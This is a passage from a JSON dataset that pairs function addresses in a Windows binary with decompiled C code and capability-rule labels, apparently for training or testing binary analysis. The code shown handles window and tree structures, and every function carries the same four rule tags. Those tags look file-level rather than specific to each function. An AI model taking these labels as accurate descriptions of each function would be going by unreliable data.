(**(**(arg_8h + -8) + 0x40))(*(arg_8h + -0xc));\n        if (cVar1 != '\\0') {\n            *(arg_8h + -0x10) = in_EAX;\n        }\n    }\ncode_r0x0045b4db:\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0045aad0();\n        if (iVar2 != 0) {\n            iVar2 = arg_8h;\n            fcn.0045aad0();\n            fcn.0045b418(iVar2);\n        }\n    }\n    if (*(arg_8h + -0x10) == 0) {\n        iVar2 = fcn.0045aaf8();\n        if (iVar2 != 0) {\n            fcn.0045aaf8();\n            fcn.0045b418(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 597
    },
    "0045b52c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045b52c(uint *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar *arg_8h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h = &stack0xfffffffc;\n    var_10h = 0;\n    *param_1 = 0;\n    iVar1 = fcn.0045b38c();\n    if ((iVar1 == 0) || (*(in_EAX + 0x14) != *(iVar1 + 0x94))) {\n        iVar2 = fcn.0045aaf8();\n        if ((iVar2 != 0) && (iVar1 == 0)) {\n            fcn.0045aaf8();\n            fcn.0045b418(arg_8h);\n        }\n    }\n    else {\n        var_10h = fcn.0045ad48();\n        if (var_10h != 0) {\n            *param_1 = 1;\n        }\n    }\n    return var_10h;\n}\n",
        "token_count": 262
    },
    "0045b5b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b5b4(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint var_4h;\n    \n    fcn.00405530();\n    (**(**(arg_8h + -4) + 0xc))();\n    if (0 < in_ECX) {\n        fcn.00405c6c();\n        (**(**(arg_8h + -4) + 0xc))();\n    }\n    return;\n}\n",
        "token_count": 108
    },
    "0045b5fc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0045b5fc(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint *arg_ch;\n    uint uVar6;\n    uint uStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uchar var_26h;\n    int32_t var_25h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack88 = &stack0xfffffffc;\n    var_8h = 0;\n    uStack92 = 0x45b93f;\n    uStack96 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack96;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.0045bf00();\n    var_25h._0_1_ = *(var_ch + 0x1d);\n    fcn.0045acd8();\n    uVar6 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff94;\n    (**(*var_4h + 0xc))();\n    if (var_1ch == 0x40000) {\n        *(var_ch + 0x1d) = 0;\n        var_26h = 0;\n    }\n    else if (var_ch[0x1c] == var_1ch) {\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n    }\n    else {\n        var_40h = var_ch[0x1c];\n        var_3ch._0_1_ = 0;\n        var_38h = var_1ch;\n        var_34h._0_1_ = 0;\n        arg_ch = &var_40h;\n        uVar4 = 1;\n        fcn.00407550();\n        fcn.0040db40(uVar4, arg_ch);\n        fcn.00404ec4();\n    }\n    (**(*var_4h + 0xc))();\n    if (-1 < var_20h + -1) {\n        var_30h = var_20h;\n        var_1ch = 0;\n        do {\n            fcn.0045b5b4(&stack0xfffffffc);\n            if (var_8h != 0) {\n                fcn.0040484c();\n                if (var_10h != 0) {\n                    fcn.00450750();\n                    uVar6 = 0;\n                    fcn.00451630(0);\n                }\n            }\n            var_1ch = var_1ch + 1;\n            var_30h = var_30h + -1;\n        } while (var_30h != 0);\n    }\n    (**(*var_4h + 0xc))();\n    if (*(var_ch + 0x1d) != '\\0') {\n        (**(*var_ch + 0x28))();\n        iVar2 = fcn.0045cff0();\n        var_ch[0x1a] = iVar2;\n    }\n    var_18h = 0;\n    iVar2 = 0;\ncode_r0x0045b79a:\n    do {\n        (**(*var_4h + 0xc))();\n        if (var_14h == *0x493770) {\n            *in_FS_OFFSET = uVar6;\n            *(var_ch + 0x1d) = var_25h;\n            if (var_ch[0x19] == 0) {\n                iVar2 = fcn.0045a478();\n                var_ch[0x19] = iVar2;\n            }\n            fcn.0045acdc();\n            return;\n        }\n        iVar3 = fcn.0045a478();\n        (**(*var_4h + 0xc))();\n        (**(*var_4h + 0xc))();\n        if (*(var_ch + 0x1d) != '\\0') {\n            (**(*var_ch + 0x28))();\n            uVar4 = fcn.0045cff0();\n            *(iVar3 + 0x20) = uVar4;\n        }\n        fcn.0045b5b4(&stack0xfffffffc);\n        if (var_8h != 0) {\n            cVar1 = fcn.0045a7c4();\n            if (cVar1 == '\\0') {\n                fcn.00404650();\n                goto code_r0x0045b79a;\n            }\n        }\n        if (var_14h == 0) {\n            var_ch[0x19] = iVar3;\n        }\n        else if (var_14h == var_18h) {\n            iVar5 = iVar2;\n            if ((*(iVar2 + 0x18) != 0) && (*(iVar2 + 4) == 0)) {\n                iVar5 = *(iVar2 + 0x18);\n                var_2ch = iVar2;\n                fcn.00404650();\n            }\n            *(iVar5 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = iVar5;\n            *(iVar3 + 0x14) = *(iVar5 + 0x14);\n        }\n        else if (var_18h < var_14h) {\n            *(iVar2 + 8) = iVar3;\n            *(iVar3 + 0x14) = iVar2;\n        }\n        else if (var_14h < var_18h) {\n            unique0x10000202 = iVar2;\n            if (0 < var_18h - var_14h) {\n                var_1ch = 1;\n                var_30h = var_18h - var_14h;\n                do {\n                    unique0x00007a00 = *(stack0xffffffd8 + 0x14);\n                    var_1ch = var_1ch + 1;\n                    var_30h = var_30h + -1;\n                } while (var_30h != 0);\n            }\n            *(stack0xffffffd8 + 0xc) = iVar3;\n            *(iVar3 + 0x18) = stack0xffffffd8;\n            *(iVar3 + 0x14) = *(stack0xffffffd8 + 0x14);\n        }\n        var_18h = var_14h;\n        iVar2 = iVar3;\n    } while( true );\n}\n",
        "token_count": 1575
    },
    "0045bc1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045bc1c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack48 = 0x45bc35;\n    var_4h = fcn.004250b4();\n    uStack52 = 0x45bd40;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack60 = 0x45bc51;\n    puStack48 = &stack0xfffffffc;\n    fcn.0044f0dc();\n    puStack60 = 0x45bc59;\n    fcn.0042537c();\n    uStack64 = 0x45bd23;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack72 = 0x45bc71;\n    puStack60 = &stack0xfffffffc;\n    fcn.00425748();\n    uStack76 = 0x45bd06;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    iVar1 = fcn.00454684();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_ch = iVar1;\n        do {\n            iVar1 = fcn.00454648();\n            if ((*(iVar1 + 0x57) != '\\0') && (*(iVar1 + 0x94) == in_EAX[5])) {\n                fcn.00450150();\n                (***in_EAX)();\n                (**(*in_EAX + 4))();\n                (**(*in_EAX + 0x20))(&fcn.0045bc1c::var_1ch);\n            }\n            var_8h = var_8h + 1;\n            var_ch = var_ch + -1;\n        } while (var_ch != 0);\n    }\n    *in_FS_OFFSET = uStack80;\n    puStack72 = 0x45bd0d;\n    uStack76 = 0x45bd05;\n    fcn.00425748();\n    return;\n}\n",
        "token_count": 574
    },
    "0045bd50": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045bd50(int32_t *arg_8h, uint arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint *arg_8h_00;\n    int32_t var_1ch;\n    int32_t iStack28;\n    int32_t iStack24;\n    int32_t iStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar2 = fcn.00456fdc();\n    if (((in_ECX == 0) || (*(in_ECX + 0x90) == '\\0')) || (iVar2 < 2)) {\n        uVar3 = fcn.004501f0();\n        arg_8h_00 = &var_1ch;\n        fcn.004501ac();\n        fcn.00418464(arg_8h_00, uVar3);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n        if (0 < iVar2) {\n            if (arg_ch == '\\x01') {\n                arg_8h[3] = arg_8h[3] / 2;\n            }\n            else if (arg_ch == '\\x02') {\n                iVar2 = arg_8h[3] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[3] & 1U) != 0);\n                }\n                arg_8h[1] = iVar2;\n            }\n            else if (arg_ch == '\\x03') {\n                arg_8h[2] = arg_8h[2] / 2;\n            }\n            else if (arg_ch == '\\x04') {\n                iVar2 = arg_8h[2] >> 1;\n                if (iVar2 < 0) {\n                    iVar2 = iVar2 + ((arg_8h[2] & 1U) != 0);\n                }\n                *arg_8h = iVar2;\n            }\n        }\n    }\n    else {\n        var_4h = *(in_ECX + 0x40);\n        var_8h = *(in_ECX + 0x44);\n        uVar4 = *(in_ECX + 0x48);\n        var_ch = *(in_ECX + 0x4c);\n        if (arg_ch - 3U < 2) {\n            uVar1 = uVar4 & 1;\n            uVar4 = uVar4 >> 1;\n            if (uVar4 < 0) {\n                uVar4 = uVar4 + (uVar1 != 0);\n            }\n        }\n        else if (arg_ch - 1U < 2) {\n            var_ch = *(in_ECX + 0x4c) >> 1;\n            if (var_ch < 0) {\n                var_ch = var_ch + ((*(in_ECX + 0x4c) & 1) != 0);\n            }\n        }\n        if (arg_ch == '\\x02') {\n            var_8h = var_8h + var_ch;\n        }\n        else if (arg_ch == '\\x04') {\n            var_4h = var_4h + uVar4;\n        }\n        fcn.0041848c(&var_1ch, var_ch);\n        *arg_8h = var_1ch;\n        arg_8h[1] = iStack28;\n        arg_8h[2] = iStack24;\n        arg_8h[3] = iStack20;\n    }\n    uVar3 = fcn.00458594(0, arg_8h, 2);\n    sub.user32.dll_MapWindowPoints(uVar3);\n    return;\n}\n",
        "token_count": 886
    },
    "0045bf9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045bf9c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY52;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    var_ch = 0;\n    uStack40 = 0x45c22d;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar2 = &stack0xfffffffc;\n    if (param_2 == 0) {\n        fcn.00407550();\n        uStackY52 = 0x45bfdc;\n        fcn.00407550(&fcn.0045bf9c::var_4h);\n        fcn.00405818();\n        fcn.0040db04();\n        fcn.00404ec4();\n        puVar2 = puStack36;\n    }\n    puStack36 = puVar2;\n    if (*(param_2 + 4) == 0) {\n        fcn.00407550();\n        uStackY52 = 0x45c01d;\n        fcn.00407550(&fcn.0045bf9c::var_ch);\n        fcn.00405818();\n        fcn.0040db04();\n        fcn.00404ec4();\n    }\n    iVar3 = fcn.0045a49c();\n    if (iVar3 == 1) {\n        iVar3 = *(in_EAX + 100);\n        *(iVar3 + 8) = 0;\n        *(iVar3 + 0x10) = 0;\n    }\n    else if (iVar3 == 2) {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            iVar3 = *(param_2 + 0xc);\n        }\n        if (*(iVar3 + 4) == 0) {\n            if (*(param_2 + 0x14) == *(in_EAX + 100)) {\n                fcn.0045aa30();\n                uVar4 = fcn.0045a9f4();\n                *(in_EAX + 0x68) = uVar4;\n                fcn.00404650();\n                *(in_EAX + 100) = iVar3;\n                *(iVar3 + 0xc) = 0;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0x14) = 0;\n                fcn.0045c884();\n            }\n            else {\n                iVar1 = *(iVar3 + 8);\n                if (iVar1 == 0) {\n                    *(*(iVar3 + 0x14) + 8) = 0;\n                    fcn.00404650();\n                }\n                else {\n                    *(iVar1 + 0x18) = *(*(param_2 + 0x14) + 0x18);\n                    if (*(*(iVar3 + 8) + 0x18) == 0) {\n                        *(*(*(param_2 + 0x14) + 0x14) + 8) = iVar1;\n                    }\n                    else {\n                        *(*(*(iVar3 + 8) + 0x18) + 0xc) = iVar1;\n                    }\n                    iVar3 = *(iVar3 + 8);\n                    *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                    iVar1 = *(iVar3 + 0xc);\n                    while (iVar1 != 0) {\n                        iVar3 = *(iVar3 + 0xc);\n                        *(iVar3 + 0x14) = *(*(param_2 + 0x14) + 0x14);\n                        iVar1 = *(iVar3 + 0xc);\n                    }\n                    *(iVar3 + 0xc) = *(*(param_2 + 0x14) + 0xc);\n                    if (*(iVar3 + 0xc) != 0) {\n                        *(*(iVar3 + 0xc) + 0x18) = iVar3;\n                    }\n                    uStackY52 = 0x45c8ac;\n                    fcn.0045adb0();\n                    fcn.00404650();\n                    fcn.00404650();\n                }\n            }\n        }\n        else {\n            iVar1 = *(param_2 + 0x14);\n            if (*(in_EAX + 100) == iVar1) {\n                *(*(in_EAX + 100) + 8) = iVar3;\n                *(iVar3 + 0x18) = 0;\n                *(iVar3 + 0xc) = 0;\n                fcn.0045a554();\n                fcn.0045aa1c();\n                fcn.0045a878();\n            }\n            else {\n                *(iVar1 + 0x10) = 0;\n                *(iVar1 + 4) = *(iVar3 + 4);\n                *(iVar1 + 8) = 0;\n                fcn.00404650();\n            }\n            uStackY52 = 0x45c8ac;\n            fcn.0045adb0();\n        }\n    }\n    else {\n        iVar3 = *(param_2 + 0x18);\n        if (iVar3 == 0) {\n            *(*(param_2 + 0x14) + 8) = *(param_2 + 0xc);\n            *(*(param_2 + 0xc) + 0x18) = 0;\n            fcn.0045a878();\n        }\n        else {\n            *(iVar3 + 0xc) = *(param_2 + 0xc);\n            if (*(param_2 + 0xc) != 0) {\n                *(*(param_2 + 0xc) + 0x18) = iVar3;\n            }\n            fcn.0045a9f4();\n            fcn.0045aa30();\n            fcn.0045a878();\n        }\n        uStackY52 = 0x45c8ac;\n        fcn.0045adb0();\n    }\n    fcn.00404650();\n    *in_FS_OFFSET = uStackY52;\n    uStack44 = 0x45c234;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1467
    },
    "0045c3e0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c3e0(int32_t arg_8h)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    int32_t arg_8h_00;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45c4e0;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (((in_EAX == *(*(arg_8h + -8) + 100)) || (*(in_EAX + 8) != 0)) ||\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 4) != 0)) {\n        (**(**(arg_8h + -4) + 0x10))();\n        (**(**(arg_8h + -4) + 0x10))();\n        if (*(*(arg_8h + -8) + 0x74) != '\\0') {\n            (**(**(arg_8h + -8) + 0x28))();\n            fcn.0045d020();\n        }\n        (**(**(arg_8h + -4) + 0x10))();\n        arg_8h_00 = arg_8h;\n        fcn.0045a780();\n        fcn.0045c364(arg_8h_00);\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045c3e0(arg_8h);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045c3e0(arg_8h);\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45c4e7;\n    uStack32 = 0x45c4df;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 483
    },
    "0045c4f0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c4f0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uchar *arg_8h;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x45c697;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x45c524;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c537;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c54d;\n    (**(*param_2 + 0x10))();\n    puStack52 = 0x45c559;\n    piVar1 = fcn.00404620();\n    uStack56 = 0x45c610;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    iVar2 = fcn.00456f48();\n    if (-1 < iVar2 + -1) {\n        do {\n            iVar3 = fcn.00456f5c();\n            if ((*(iVar3 + 0x57) == '\\0') && (*(iVar3 + 8) != 0)) {\n                (**(*piVar1 + 0x38))();\n            }\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    iVar2 = (**(*piVar1 + 0x14))();\n    (**(*param_2 + 0x10))();\n    if (-1 < iVar2 + -1) {\n        do {\n            arg_8h = &stack0xfffffffc;\n            (**(*piVar1 + 0xc))();\n            fcn.0045c364(arg_8h);\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x45c617;\n    uStack56 = 0x45c60f;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 592
    },
    "0045c884": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045c884(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x6c) == 0) {\n        iVar1 = fcn.00456f48();\n        if (0 < iVar1) {\n            fcn.0045adb0(0x45c8ac);\n        }\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0045c9bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045c9bc(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((in_EAX != *(arg_8h + -4)) && (*(*(in_EAX + 0x14) + 0x10) == *(*(*(arg_8h + -4) + 0x14) + 0x10))) {\n        iVar1 = fcn.0045a9f4();\n        iVar2 = fcn.0045a9f4();\n        if ((iVar2 < iVar1) && ((*(in_EAX + 4) == 0 || ((*(in_EAX + 4) != 0 && (*(*(in_EAX + 4) + 0x57) != '\\0')))))) {\n            iVar1 = *(arg_8h + -8);\n            iVar2 = fcn.0045a9f4();\n            if (iVar1 < iVar2) {\n                iVar2 = iVar1;\n            }\n            *(arg_8h + -8) = iVar2;\n        }\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        fcn.0045c9bc(arg_8h);\n    }\n    if (*(in_EAX + 8) != 0) {\n        fcn.0045c9bc(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "0045cb98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045cb98(int32_t arg_8h)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x14) != 0) && (*(in_EAX + 0x14) != *(*(arg_8h + -4) + 100))) {\n        iVar2 = fcn.0045a4b0();\n        if (iVar2 == 1) {\n            fcn.0045cb98(arg_8h);\n        }\n    }\n    iVar2 = fcn.0045a4b0();\n    if ((iVar2 == 1) || (*(in_EAX + 0x24) == 0)) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n        iVar2 = *(*(arg_8h + -4) + 0x18) + *(*(arg_8h + -4) + 0xc) + 0xe;\n        iVar3 = fcn.0045aadc();\n        if (iVar3 == 0) {\n            iVar3 = fcn.0045aad0();\n            if (iVar3 != 0) {\n                fcn.0045aad0();\n                iVar3 = fcn.0045a9f4();\n                if (iVar3 - *(in_EAX + 0x24) < iVar2) {\n                    bVar1 = true;\n                }\n                else {\n                    fcn.0045a50c();\n                    fcn.0045aa1c();\n                    fcn.0045aad0();\n                    fcn.0045aa70();\n                }\n            }\n        }\n        else {\n            fcn.0045aadc();\n            iVar3 = fcn.0045a9f4();\n            iVar4 = fcn.0045a50c();\n            if ((iVar3 - iVar4) - *(in_EAX + 0x24) < iVar2) {\n                bVar1 = true;\n            }\n            else {\n                fcn.0045a9f4();\n                fcn.0045aa1c();\n                fcn.0045a9f4();\n                fcn.0045aa1c();\n                fcn.0045aadc();\n                fcn.0045aa70();\n            }\n        }\n    }\n    if (bVar1) {\n        fcn.0045a6d8();\n    }\n    fcn.0045adb0(0x45c8ac, *(arg_8h + -4));\n    return;\n}\n",
        "token_count": 583
    },
    "0045d0c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045d0c4(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint8_t in_CL;\n    char in_DL;\n    uint var_2ch;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    if (in_DL == '\\0') {\n        if ((in_CL & 0x40) == 0) {\n            fcn.00418428();\n            iVar2 = fcn.0045b52c();\n            if (iVar2 != 0) {\n                if (var_8h == 0x12) {\n                    fcn.00418428();\n                    fcn.0045c7a8();\n                }\n                else if (var_8h == 2) {\n                    uVar3 = fcn.00458594(0x203, 0x203, 0);\n                    iVar4 = sub.user32.dll_PeekMessageA(&var_24h, uVar3);\n                    if (iVar4 == 0) {\n                        cVar1 = fcn.004047dc();\n                        if (cVar1 != '\\0') {\n                            (**(**(iVar2 + 4) + 0xd4))();\n                        }\n                    }\n                    if ((*(*(iVar2 + 4) + 0x8f) == '\\x01') && (*(*(iVar2 + 4) + 0x5d) == '\\x01')) {\n                        fcn.00450f6c();\n                    }\n                    *arg_8h = 1;\n                }\n            }\n        }\n        else {\n            fcn.00418428();\n            iVar2 = fcn.0045b52c();\n            if (((iVar2 != 0) && (*(iVar2 + 4) != 0)) && (var_8h == 2)) {\n                fcn.0044ed5c();\n                fcn.00451630(1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 481
    },
    "0045d278": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d278(uint noname_0, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x60) != 0) {\n        fcn.0045c8d0();\n        fcn.00418428();\n        *(in_EAX + 0x50) = var_ch;\n        *(in_EAX + 0x54) = var_8h;\n        fcn.0045d1e8(&stack0xfffffffc);\n        fcn.0045c8d0();\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0045d2c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d2c8(uint noname_0, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char in_DL;\n    uint var_ch;\n    int32_t var_4h;\n    \n    if (in_DL == '\\0') {\n        if (*(in_EAX + 0x60) == 0) {\n            fcn.00418428();\n            iVar2 = fcn.0045b52c();\n            if ((iVar2 != 0) && (var_4h == 0x14)) {\n                cVar1 = fcn.004047dc();\n                if (cVar1 == '\\0') {\n                    fcn.00450750();\n                }\n                else {\n                    fcn.004429a0();\n                }\n            }\n        }\n        else {\n            fcn.0045c808();\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "0045d4c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045d4c0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x2c) != 0) && (*(in_EAX + 0x20) != '\\0')) {\n        fcn.0045d600();\n        uVar1 = (**(*(in_EAX + 0x2c) + 0x2c))();\n        *(in_EAX + 0x28) = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "0045d534": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
